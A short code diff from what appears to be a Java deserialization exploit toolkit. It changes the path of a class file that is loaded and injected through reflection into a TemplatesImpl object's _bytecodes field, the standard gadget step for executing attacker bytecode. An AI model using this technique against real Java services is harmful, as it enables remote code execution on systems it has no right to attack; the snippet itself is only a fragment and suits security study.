@@ -15,7 +15,7 @@ import java.util.Properties;
  */
 public class CustomTemplatesImpl {
     public static void main(String[] args) throws Exception{
-        byte[] Abs = TransforBytes.BytesFromFile("/Users/0x22cb7139/programing/java/jcoffe/utils/target/classes/com/sorry/utils/templatesimpl/CustomAbstractTranslet.class");
+        byte[] Abs = TransforBytes.BytesFromFile("/Users/0x22cb7139/programing/java/jcoffe/test.class");
         TemplatesImpl templates = new TemplatesImpl();
         Reflections.setFieldValue(templates,"_bytecodes",new byte[][] {Abs});
         Reflections.setFieldValue(templates,"_name","Pwner");
